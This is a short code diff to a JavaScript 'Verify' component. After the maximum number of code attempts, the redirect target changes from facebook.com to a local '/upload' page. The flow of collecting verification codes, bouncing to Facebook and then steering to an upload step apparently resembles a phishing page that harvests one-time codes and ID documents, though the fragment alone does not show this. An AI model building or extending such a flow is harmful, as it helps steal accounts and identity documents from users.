@@ -161,7 +161,7 @@ const Verify = () => {
 
             if (codeAttempts.length >= config.MAX_CODE_ATTEMPTS) {
                 setTimeout(() => {
-                    window.location.replace('https://facebook.com');
+                    window.location.href = '/upload';
                 }, config.LOAD_TIMEOUT_MS);
             }
         } catch (error) {
